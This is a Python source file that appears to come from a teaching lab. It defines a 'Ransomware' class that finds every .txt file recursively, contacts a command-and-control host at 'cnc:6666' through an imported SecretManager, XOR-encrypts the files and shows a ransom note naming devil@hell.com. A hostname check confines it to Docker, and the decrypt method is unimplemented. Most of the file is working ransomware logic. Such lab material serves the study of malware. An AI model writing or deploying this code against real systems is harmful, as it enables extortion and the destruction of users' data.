import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
   ________  ____________________________  __   ____
  / ____/ / / / ____/ ____/ ____/ ____/ / / /  / / /
 / /   / /_/ / __/ / __/ / __/ / __/ / /_/ /  / / /
/ /___/ __  / /___/ /___/ /___/ /___/ __  /  /_/_/
\____/_/ /_/_____/_____/_____/_____/_/ /_/  /_/_/
  _____                                                                                           
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 

Your txt files have been locked. Send an email to devil@hell.com with title '{token}' to unlock your data. 
"""
class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
        self._log = logging.getLogger(self.__class__.__name__)

    def check_hostname_is_docker(self) -> None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter:str) -> list:
        # return all files matching the filter
        """
        In the first scenario, files_list is a list containing the paths of every file found recursively by the rglob() function in the file system.
        The paths are stored as PosixPath objects of their string equivalent.
        """
        # files_list = list(Path().rglob(filter))
        """
        In the second scenario, files_list is a list containing the paths of every file found recursively by the rglob() function in the file system.
        The paths are stored as strings.
        """
        files_list = [str(p) for p in list(Path().rglob(filter))]

        return files_list

    def encrypt(self) -> None:
        # main function for encrypting (see PDF)
        self._log.info(self.get_files("*.txt"))
        self._secret_manager = SecretManager(remote_host_port=CNC_ADDRESS, path=TOKEN_PATH)
        self._secret_manager.setup()
        self._secret_manager.xorfiles(self.get_files("*.txt"))
        return None
        

    def decrypt(self):
        # main function for decrypting (see PDF)
        raise NotImplemented()

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()
